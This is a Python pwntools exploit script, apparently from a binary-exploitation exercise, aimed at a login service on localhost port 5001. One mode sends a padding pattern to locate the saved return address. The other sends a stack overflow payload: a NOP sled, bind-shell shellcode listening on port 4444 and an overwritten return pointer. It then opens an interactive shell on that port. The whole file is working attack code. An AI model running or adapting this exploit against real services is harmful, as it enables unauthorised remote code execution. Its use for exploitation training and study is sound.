import time
import struct
import sys
import argparse
from pwn import *

context.update(arch='amd64', os='linux')

parser = argparse.ArgumentParser()
parser.add_argument("--offset", type=int, required=True)
parser.add_argument("--address", type=str)
args = parser.parse_args()


def main():
    print("Dont forget to start the server in the background")

    io = remote("localhost", 5001)
    gdb.attach(io, '''
set follow-fork-mode child
continue
''')

    if args.address is None:
        print("--[ Send pattern")
        pattern = makePattern(args.offset)
        print(hexdump(pattern, skip=False))

        io.sendafter(b"Username: ", pattern)
        io.sendafter(b"Password: ", b"password")
        io.recvall()
        #io.wait()
        return

    else:
        print("--[ Send exploit")
        exploit = makeExploit(args.offset, int(args.address, 16), buf_size=256)
        print(hexdump(exploit, skip=False))

        io.sendafter(b"Username: ", exploit)
        io.sendafter(b"Password: ", b"password")
        checkShell()
        return

def makePattern(offset):
    pattern = b'XXXX'
    pattern += b'A' * (offset - 4)
    pattern += b'BBBB' # RIP
    return pattern

def makeExploit(offset, address, buf_size=128):
    s = shellcraft.amd64.linux.bindsh(4444, "ipv4")
    shellcode = asm(s)
    exploit = b'\x90' * (buf_size - len(shellcode))
    exploit += shellcode
    exploit += b'A' * (offset - len(exploit))
    exploit += p64(address)
    return exploit

def checkShell():
    time.sleep(0.1)
    try:
        ioShell = remote("localhost", 4444)
        ioShell.interactive()
    except Exception as e:
        print("Error: Remote shell not started.")
        pass

if __name__ == '__main__':
        main()
